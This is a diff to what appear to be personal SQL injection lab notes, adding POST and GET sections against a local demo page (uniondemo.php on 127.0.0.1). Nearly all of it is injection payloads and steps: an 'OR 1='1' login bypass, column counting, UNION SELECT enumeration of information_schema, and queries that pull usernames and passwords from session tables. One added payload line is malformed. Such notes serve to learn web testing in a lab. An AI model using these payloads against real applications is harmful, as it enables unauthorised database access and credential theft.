@@ -274,7 +274,8 @@ username=%27OR+1%3D%271&passwd=%27OR+1%3D%271 (WHAT YOU PASTE SHOULD LOOK LIKE T
     [1] => BWyane
     [pass] => BWyane
 
-####  SQL INJECTION
+####  SQL INJECTION POST
+________________________________________________________________________________________________________
 1. Blind Injection (identify vulnerable field)
 - make selection (Audi 'OR 1='1) (Audi 'OR 1='1 #) sometimes you might have to use the octothorpe.
 
@@ -292,12 +293,22 @@ UNION SELECT column_name,column_name FROM database.table
 Audi' UNION SELECT 1,2,table_schema,4,5 FROM information_schema.columns; #
 Audi' UNION SELECT 1,2,username,passwd,jump FROM session.userinfo; #
 Audi' UNION SELECT 1,2,id,name,pass FROM session.user; #
+Audi' UNION SELECT @@Version 1,2,id,name,pass FROM session.user; #
 
 
 
 
 
+##### SQL INJECTION GET
+________________________________________________________________________________________________________________
+1. Blind Injection (Identify Vulnerable Field)
+http://127.0.0.1:6767/uniondemo.php?Selection=1 OR 1=1      (Can change number after "Selection" until it works)
 
+2. Identify Number of Columns
+http://127.0.0.1:6767/uniondemo.php?Selection=2 UNION SELECT 1,2,3
 
+3. GOLDEN STATEMENT
+php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
 
-
+4. Craft Queries
+php?Selection=2 UNION SELECT column_name,column_name,column_name FROM database.table
